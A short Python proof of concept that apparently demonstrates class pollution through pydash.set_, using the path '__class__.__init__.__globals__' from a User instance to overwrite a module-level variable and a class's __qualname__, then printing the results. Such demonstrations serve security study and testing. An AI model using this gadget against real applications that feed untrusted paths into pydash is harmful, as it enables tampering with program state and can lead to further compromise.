import pydash

class User:
    def __init__(self):
        pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'
pydash.set_(User(), '__class__.__init__.__globals__.not_accessible_variable','Polluted variable')
print(not_accessible_variable)
pydash.set_(User(), '__class__.__init__.__globals__.NotAccessibleClass.__qualname__','PollutedClass')
print(NotAccessibleClass)